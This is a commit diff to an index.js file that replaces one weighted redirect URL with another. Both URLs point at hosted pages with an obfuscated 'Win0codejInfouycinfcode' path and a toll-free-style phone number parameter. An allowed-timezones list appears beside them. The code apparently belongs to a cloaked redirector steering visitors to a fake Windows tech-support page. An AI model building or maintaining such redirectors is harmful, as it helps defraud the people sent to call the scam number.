255d76051830e25615f97566049b34a18738bfb9
paalakash <palaksh452@gmail.com>
2026-06-09 14:52:03 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-7t5cw.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3660", weight: 1.0 }
+    { url: "https://starfish-app-33kj9.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3660", weight: 1.0 }
 
 ];
 
